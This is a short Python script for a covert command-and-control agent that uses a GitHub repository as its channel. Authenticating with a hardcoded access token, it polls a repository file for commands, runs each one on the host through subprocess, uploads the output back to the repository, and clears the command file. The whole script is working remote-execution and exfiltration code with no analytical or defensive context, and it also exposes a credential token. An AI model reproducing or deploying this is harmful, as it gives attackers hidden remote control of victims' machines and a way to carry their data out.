from github import Github
import subprocess
import random
import string
import time
import shlex
from base64 import b64decode

print("[+] Stating C2C communication")
git_client = Github("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")
git_user = git_client.get_user()
git_repo = git_user.get_repo('demo99')

while True:
        remote_command_file = git_repo.get_contents('test')
        remote_file_content = b64decode(remote_command_file.content).decode().strip()

        try:
                remote_command = remote_file_content.split('||')[1].strip()
                file_id = str(remote_file_content).split('||')[0].strip()

                if len(remote_command) >= 1:
                        print("[+] Recieved new command:", remote_command)
                        result = subprocess.check_output(shlex.split(remote_command)).strip()
                        print(result.decode())
                        print("\n\n")
                        git_repo.create_file(file_id, 'test', result)
                        git_repo.update_file('test', '', '', remote_command_file.sha)
                time.sleep(10)
        except IndexError:
                time.sleep(5)
